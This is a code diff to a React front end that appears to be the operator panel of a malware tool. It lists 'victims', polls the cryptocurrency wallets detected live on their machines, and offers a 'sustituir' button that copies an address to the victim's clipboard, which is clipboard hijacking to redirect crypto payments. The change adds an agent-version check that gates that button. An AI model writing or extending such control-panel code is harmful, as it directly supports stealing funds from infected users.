@@ -27,7 +27,7 @@ import { MinecraftCard } from '@/components/minecraft-card';
 import { TimelinePanel } from '@/components/timeline-panel';
 import { cn } from '@/lib/cn';
 import { humanError } from '@/lib/errors';
-import { ACTION_MAP } from '@/lib/actions';
+import { ACTION_MAP, versionAtLeast } from '@/lib/actions';
 
 export type DetailTab = 'resumen' | 'boveda' | 'ficheros' | 'actividad' | 'monitor' | 'chat';
 
@@ -38,6 +38,7 @@ function OpenWallets({ victim }: { victim: Victim }) {
   const last = live.events[0];
   const [address, setAddress] = useState('');
   const [busy, setBusy] = useState('');
+  const supported = versionAtLeast(victim.agentVersion, '0.4.1');
   const { data, refresh } = useApi<{ items: WalletDetection[]; count: number }>(`/victims/${victim.id}/wallets/live`, { pollMs: 15_000 });
   useEffect(() => {
     if (last?.victimId === victim.id && ['event.new', 'wallet.detected', 'wallet.closed'].includes(last.type)) refresh();
@@ -74,7 +75,7 @@ function OpenWallets({ victim }: { victim: Victim }) {
               {item.pid ? <span className="font-mono text-2xs text-muted">· {item.pid}</span> : null}
               <span className="min-w-0 flex-1 truncate text-2xs text-muted" title={item.window}>{item.window || '—'}</span>
               <span className="num text-2xs text-muted">{new Date(item.lastSeenAt).toLocaleTimeString('es-ES')}</span>
-              <Button size="sm" variant="ghost" disabled={busy === item.id} onClick={() => void replace(item)} title="Copiar la dirección al portapapeles de la víctima">sustituir</Button>
+              <Button size="sm" variant="ghost" disabled={busy === item.id || !supported} title={supported ? 'Copiar la dirección al portapapeles de la víctima' : 'Requiere agente 0.4.1'} onClick={() => void replace(item)}>sustituir</Button>
             </div>
           ))}
         </div>
